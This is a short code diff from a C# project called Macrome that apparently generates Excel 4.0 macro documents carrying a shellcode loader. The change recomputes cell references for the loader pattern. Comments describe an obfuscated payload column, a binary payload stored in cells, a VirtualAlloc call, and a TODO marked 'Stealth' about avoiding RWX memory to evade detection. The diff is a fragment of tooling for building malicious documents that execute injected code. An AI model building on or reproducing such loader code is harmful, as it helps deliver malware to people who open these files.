@@ -7,18 +7,26 @@ namespace Macrome
     {
         public static List<String> GetBinaryLoaderPattern(List<string> preamble, string macroSheetName)
         {
+            int offset;
+            if (preamble.Count == 0)
+            {
+                offset = 1;
+            } else
+            {
+                offset = preamble.Count;
+            }
             //TODO Autocalculate these values at generation time
             //These variables assume certain positions in generated macros
             //Col 1 is our obfuscated payload
             //Col 2 is our actual macro set defined below
             //Col 3 is a separated set of cells containing a binary payload, ends with the string END
-            string lengthCounter = "R1C4";
-            string offsetCounter = "R2C4";
-            string dataCellRef = "R3C4";
+            string lengthCounter = String.Format("R{0}C4", offset);
+            string offsetCounter = String.Format("R{0}C4", offset + 1);
+            string dataCellRef = String.Format("R{0}C4", offset + 2);
             string dataCol = "C3";
 
             //Expects our invocation of VirtualAlloc to be on row 5, but this will change if the macro changes
-            string baseMemoryAddress = "R5C2";
+            string baseMemoryAddress = String.Format("R{0}C2", preamble.Count + 4); //for some reason this only works when its count, not offset
 
             //TODO [Stealth] Add VirtualProtect so we don't call VirtualAlloc with RWX permissions
             //TODO [Functionality] Apply x64 support changes from https://github.com/outflanknl/Scripts/blob/master/ShellcodeToJScript.js
